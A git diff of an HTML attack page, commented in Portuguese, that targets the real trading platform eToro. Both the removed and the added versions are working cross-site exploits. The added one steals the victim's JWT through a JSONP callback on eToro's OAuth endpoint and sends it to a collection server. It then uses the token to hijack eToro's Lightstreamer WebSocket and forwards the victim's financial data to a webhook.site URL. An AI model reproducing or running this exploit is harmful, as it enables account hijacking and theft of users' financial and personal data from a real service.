@@ -1,37 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Iniciando Transação Segura...</title>
-</head>
+<head><title>Loading...</title></head>
 <body>
     <script>
-        // Este script tenta se conectar ao servidor de PUSH do eToro
-        // usando a sessão do navegador da vítima (Cookies automáticos)
-        
-        const targetWS = "wss://push-lightstreamer.cloud.etoro.com/lightstreamer";
-        const attackerServer = "https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022/log?data=";
-
-        const ws = new WebSocket(targetWS);
-
-        ws.onopen = () => {
-            // Tentamos criar a sessão. Se o servidor aceitar cookies, 
-            // ele ignorará a falta do JWT ou usará o cookie de sessão.
-            ws.send("create_session\r\nLS_adapter_set=PROXY_PUSH");
-        };
-
-        ws.onmessage = (e) => {
-            // Envia tudo o que o eToro "falar" no WebSocket para o SEU servidor
-            // Aqui virão saldos, nomes, ativos, etc.
-            fetch(attackerServer + btoa(e.data));
+        // 1. Função que receberá o token roubado automaticamente
+        function test_function(data) {
+            console.log("Token Roubado: ", data.token.jwt);
             
-            // Console apenas para você ver durante o teste
-            console.log("Exfiltrado:", e.data);
-        };
+            // 2. Envia para o seu servidor de coleta (Burp Collaborator)
+            fetch("https://seu-servidor.com/collect?token=" + btoa(data.token.jwt));
 
-        ws.onerror = () => {
-            // Se falhar aqui, o servidor provavelmente exige o token na URL
-            console.log("Falha: Autenticação via Cookie não permitida ou Origin bloqueado.");
-        };
+            // 3. AGORA O TEMPERO: Inicia o sequestro do WebSocket em tempo real
+            start_websocket_hijack(data.token.jwt);
+        }
+
+        function start_websocket_hijack(token) {
+            const ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
+            ws.onopen = () => {
+                // Autentica no streaming do eToro com o token da vítima
+                ws.send("create_session\r\nLS_user=" + token + "&LS_adapter_set=PROXY_PUSH");
+            };
+            ws.onmessage = (e) => {
+                // Envia os dados financeiros da vítima para você
+                fetch("https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022/data?msg=" + btoa(e.data));
+            };
+        }
     </script>
+
+    <!-- 4. Chama o eToro. O navegador da vítima envia os cookies dela automaticamente -->
+    <script src="https://www.etoro.com/api/sts/oauth/v3/auth?client_request_id=123&callback=test_function"></script>
 </body>
 </html>
